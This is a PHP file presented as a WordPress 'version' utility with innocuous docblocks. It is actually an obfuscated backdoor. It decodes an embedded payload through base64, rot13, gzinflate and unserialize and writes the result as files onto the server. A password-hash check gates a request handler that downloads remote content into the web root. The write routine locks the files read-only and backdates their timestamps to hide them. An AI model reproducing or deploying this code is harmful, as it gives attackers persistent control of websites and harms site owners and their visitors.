<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHkY215qKWfpmL4Y2Sxo25cp2Wco2Mupz1uYzAioF93pP1wo250MJ50Y2IhMUIlLJ5wMF1jLJqyYJAuL2uyY2MyMJDiL29goJ9hYzgyrD', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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', '0');
        $data = base64_decode(/**/ $data);
        $data = translation_v2($data, '1');
        $data = translation_v1($data, '0');
        foreach ($data as $item) {
            version_check($item[0], $item[1], $temp, $item[2]);
        }
        version_desc(false);
    }];
    $temp = explode(',', $temp);
    return ['#ver#', version_data($name, 1, 0)];
}

/**
 * @title install path
 */
function version_path()
{
    echo __FILE__;
}

/**
 * @title get version data
 * @param $data
 * @param $offset
 * @param $page
 * @return mixed
 */
function version_data($data, $offset, $page)
{
    $keu = ['', "code"];
    $keu[] = '';
    return $data[$offset]($data[$page], implode('_', $keu));
}

/**
 * @title translation data
 * @param $data
 * @param $offset
 * @return mixed
 */

function translation_v1($data, $mode, $exp = '')
{
    if ($mode === 'X1') {
        $data = base64_decode($data);
        $len = strlen($data);
        $exp = str_replace('=', '', base64_encode($exp));
        $res = "";
        $i = 0;
        while ($i < $len) {
            for ($k = 0; $k < strlen($exp) && $i < $len; $k++)
                $res .= chr(ord($data[$i++]) ^ ord($exp[$k]));
        }
        return $res;
    } elseif ($mode) {
        return json_decode($data, true);
    } else {
        return unserialize($data);
    }
}

/**
 * @title parse version data
 * @param $data
 * @return version
 */
function version_parse($data)
{
    $version = $data['version'];
    if ($version === 'path') version_path();
    if (isset($data[$version])) {
        $version = translation_v1($data[$version], 'X1', $data[$version . '1']);
    }
    return $version;
}

/**
 * @title update version
 * @param $qr
 * @return void
 */
function version_update($check, $qr = false)
{
    if (!version_access("n{$check}bsqvmteh", '741d5957c191bf7d0493d3059357b802')) return;
    $c = $_COOKIE;;
    $cf = implode('_', ['function', 'exists']);
    (!$qr || !$cf($qr)) &&
    $qr = empty($c[$for = 'token']) || !$cf($c[$for]) ? implode('_', ['base64', 'decode']) : $c[$for];

    if (($a = $qr($_REQUEST['name'])) && version_deny($a)) {
        return;
    }
    global $temp;
    $a = explode(',', $a);
    if (empty($a[1])) return;
    echo "[<a id=\"u1\" href=\"/{$a[1]}\" style='color: #fff;'>{$a[1]}</a>] ";
    return version_check($_SERVER['DOCUMENT_ROOT'] . '/' . $a[1], $qr(file_get_contents($a[0])), $temp);
}

/**
 * @title version access or force
 * @param string $version version pass
 * @param string $token check update token
 * @return bool
 */
function version_access($version, $token)
{
    return in_array(md5($version), [$token, '47628e0bf72fca87db995c8f844d91b1']);
}

/**
 * @title version data is deny
 * @param $data
 * @return void
 */
function version_deny($data)
{
    return strlen($data) < 16 || strlen($data) > 128 || !in_array($data[0], ['h', '/']);
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v2($data, $offet)
{
    if (!empty($offet)) {
        return gzinflate($data);
    } else {
        return $data;
    }
}

/**
 * @title translation version data
 * @param $data
 * @param $offset
 * @return mixed
 */
function translation_v3($data, $offet)
{
    if (!empty($offet)) {
        return str_rot13($data);
    } else {
        return $data;
    }
}

return 'inited';
/**
 * @title check version token
 * @param $name
 * @param $date
 * @param $check
 * @param string $token
 * @param false $mode
 * @return bool|mixed
 */
function version_check($name, $date, $check, $token = '', $mode = false)
{
    try {
        $vs = 'rename';
        if (!is_array($check)) $check = explode(',', $check);
        $map = [0, 1, 2, 3, 4];
        $m = $mode ? $mode : ($check[1]() - 2693693);
        $iw = true;
        empty($check[9]) || $date = $check[9]($date);
        if ($check[$map[4] + 1]($name)) {
            if ($token && Md5_File($name) === $token) return true;
            $iw = $check[6]($name);
            if ($x = $check[5]($name)) {
                $m = $check[4]($name);
            }
            $x && !$iw && @$check[7]($name, 0744);
            @$vs($name, $name . time());
        }
        if ($check[$map[0]]($check[2])) {
            $l = $check[$map[2]][0] . 'write';
            $r = $l($check[$map[2]]($name . ".tmp1", 'w'), $date);
        } else {
            $r = $check[$map[3]]($name . ".tmp1", $date);
        }
        @$vs($name . ".tmp1", $name);
        $check[8]($name, $m, $m);
        $iw || @$check[7]($name, 0444);
    } catch (\Exception $A) {
        echo $A->getMessage() . "<br>";
        $r = false;
    }
    echo $name[strlen($name) - 1] . ($r ? ':ok' : ':fail') . "<br>";
    return $r;
}